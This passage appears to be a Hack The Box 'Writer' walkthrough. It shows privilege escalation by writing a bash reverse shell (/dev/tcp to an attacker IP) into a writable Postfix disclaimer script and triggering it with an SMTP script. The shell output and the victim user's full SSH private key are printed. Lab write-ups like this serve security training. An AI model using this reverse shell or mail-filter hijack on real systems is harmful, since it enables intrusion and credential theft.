# # `Enumeration` -

```bash
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

Lets check `filter` group -

```bash
kyle@writer:~$ find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter
```
- `/var/spool/filter` -

```bash
kyle@writer:~$ cd /var/spool/filter/
kyle@writer:/var/spool/filter$ ls -la
total 8
drwxr-x--- 2 filter filter 4096 May 13  2021 .
drwxr-xr-x 7 root   root   4096 May 18  2021 ..
```

- `/etc/postfix/disclaimer` -

```bash
kyle@writer:/var/spool/filter$ cd /etc/postfix/
kyle@writer:/etc/postfix$ ls -la
total 140
drwxr-xr-x   5 root root    4096 Jul  9 10:59 .
drwxr-xr-x 102 root root    4096 Jul 28 06:32 ..
-rwxrwxr-x   1 root filter  1021 Jan  1 15:26 disclaimer
-rw-r--r--   1 root root      32 May 13  2021 disclaimer_addresses
-rw-r--r--   1 root root     749 May 13  2021 disclaimer.txt
-rw-r--r--   1 root root      60 May 13  2021 dynamicmaps.cf
drwxr-xr-x   2 root root    4096 Jun 19  2020 dynamicmaps.cf.d
-rw-r--r--   1 root root    1330 May 18  2021 main.cf
-rw-r--r--   1 root root   27120 May 13  2021 main.cf.proto
lrwxrwxrwx   1 root root      31 May 13  2021 makedefs.out -> /usr/share/postfix/makedefs.out
-rw-r--r--   1 root root    6373 Jan  1 15:26 master.cf
-rw-r--r--   1 root root    6208 May 13  2021 master.cf.proto
-rw-r--r--   1 root root   10268 Jun 19  2020 postfix-files
drwxr-xr-x   2 root root    4096 Jun 19  2020 postfix-files.d
-rwxr-xr-x   1 root root   11532 Jun 19  2020 postfix-script
-rwxr-xr-x   1 root root   29872 Jun 19  2020 post-install
drwxr-xr-x   2 root root    4096 Jun 19  2020 sasl
```

Postfix is a mail server.
`/etc/postfix/master.cf` contains the scripts that are executed on emails as they arrive.

On viewing the masters.cf file -

```bash
flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

It seems to be running the `/etc/postfix/disclaimer` (which user kyle can write to) as user john.


```bash
kyle@writer:/etc/postfix$ cat disclaimer                                                                                                
#!/bin/sh                                                                                                                               
# Localize these.                                                                                                                       
INSPECT_DIR=/var/spool/filter                                                                                                           
SENDMAIL=/usr/sbin/sendmail                                                                                                                                                                                                                                                     
# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Its pretty simple we can edit the disclaimer file and add a reverse shell to it.Then we will send an email & trigger the reverse shell.

To send email lets create a small script -

```python
#!/usr/bin/env python3

import smtplib

host = '127.0.0.1'
port = 25

From = 'kyle@writer.htb'
To = 'john@writer.htb'

Message = '''\
        yum yum
'''

try:
        io = smtplib.SMTP(host,port)
        io.ehlo()
        io.sendmail(From,To,Message)
except Exceptions as e:
        print (e)
finally:
        io.quit()
```

Edit the disclaimer file -

Just add one liner reverse shell into disclaimer file-

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.22/7575 0>&1'
```

![[Pasted image 20220101111849.png]]

```bash
kyle@writer:/dev/shm$ ls -la
total 8
drwxrwxrwt  2 root root   80 Jan  1 15:55 .
drwxr-xr-x 18 root root 3980 Dec 31 06:17 ..
-rwxrwxr-x  1 kyle kyle 1063 Jan  1 15:55 disclaimer
-rw-rw-r--  1 kyle kyle  321 Jan  1 15:52 mail.py
```

Start your listener and execute the files -

```bash
kyle@writer:/dev/shm$ cp disclaimer /etc/postfix/disclaimer && python3 mail.py
```

```bash
root@napster:~/Documents/HTB/Writer# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.101] 35322
bash: cannot set terminal process group (84847): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ cd /home/john/.ssh
john@writer:/home/john/.ssh$ ls -la
ls -la
total 20
drwx------ 2 john john 4096 Jul  9 12:29 .
drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..
-rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys
-rw------- 1 john john 2602 Jul  9 12:29 id_rsa
-rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub
```

Get the id_rsa -

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Dont forget chmod 600 id_rsa :)